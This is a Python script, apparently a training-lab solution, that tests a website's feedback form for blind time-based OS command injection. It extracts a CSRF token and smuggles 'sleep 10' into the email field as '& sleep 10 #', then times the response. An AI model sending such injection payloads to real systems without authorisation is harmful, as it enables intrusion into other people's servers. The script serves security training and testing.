from enum import verify
import requests
import sys
import urllib3
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

def get_csrf_token(s,url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)

    soup = bs(r.text, 'html.parser')

    csrf_token = soup.find('input')['value']
    return csrf_token

def check_cmd_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    injection_payload = 'test@test.co & sleep 10 #'
    
    csrf_token = get_csrf_token(s, url)
    
    data = {
        'csrf': csrf_token,
        'name': 'test',
        'email': injection_payload,
        'subject': 'test',
        'message': 'test'
    }
    
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)

    if (res.elapsed.total_seconds() >= 10):
        print("email field vulnerable to time-based cmd injection!")
    else:
        print("email field NOT vulnerable to time-based cmd injection!")
        
def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    s = requests.Session()
    check_cmd_injection(s, url)

if __name__ == "__main__":
    main()

